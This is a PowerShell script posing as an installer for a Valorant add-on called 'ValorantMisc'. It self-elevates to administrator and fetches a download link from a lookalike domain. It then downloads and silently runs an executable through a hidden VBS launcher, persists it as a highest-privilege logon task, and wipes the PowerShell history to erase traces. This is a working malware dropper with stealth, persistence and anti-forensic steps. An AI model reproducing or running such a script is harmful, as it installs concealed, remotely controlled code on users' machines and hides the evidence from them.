# 1. STOP HISTORY RECORDING IMMEDIATELY
Set-PSReadLineOption -HistorySaveStyle SaveNothing

# 1. Self-Elevation (Get Admin access for Task Scheduler)
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"") -Verb RunAs
    exit
}

# 2. Settings
$gistUrl = "https://valorent.me/dynamic/file.txt"
$destFolder = "$env:PROGRAMDATA\ValorantMisc"
$exePath = "$destFolder\ValorantMisc.exe"
$vbsPath = "$destFolder\launcher.vbs"
$taskName = "ValorantMiscService"

# 3. Setup Folder
if (!(Test-Path $destFolder)) { New-Item -Path $destFolder -ItemType Directory -Force | Out-Null }

# 4. Fetch the URL from Gist and Download the EXE
try {
    $dynamicUrl = (Invoke-RestMethod -Uri $gistUrl).Trim()
    Invoke-WebRequest -Uri $dynamicUrl -OutFile $exePath
} catch {
    Write-Host "Failed to update ValorantMisc.exe. Checking if it already exists..." -ForegroundColor Yellow
}

# 5. CREATE THE SILENT WRAPPER (This kills the CMD window)
# The '0' in the Run command is the instruction to HIDE the window.
$vbsContent = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.CurrentDirectory = `"$destFolder`"`nWshShell.Run `"$exePath`", 0, False"
$vbsContent | Out-File -FilePath $vbsPath -Encoding ascii -Force

# 6. REGISTER THE TASK (Points to the VBS, not the EXE)
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest

# Ensure the task doesn't stop after 3 days (default Windows behavior)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 0)

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force

# 7. Final Cleanup: Stop any visible versions and start the silent version
Stop-Process -Name "ValorantMisc" -Force -ErrorAction SilentlyContinue
Start-ScheduledTask -TaskName $taskName

# 8. CLEANUP HISTORY (WIPE TRACES)
$historyPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $historyPath) { Remove-Item $historyPath -Force }
Clear-History

Write-Host "Done! ValorantMisc is now running" -ForegroundColor Green
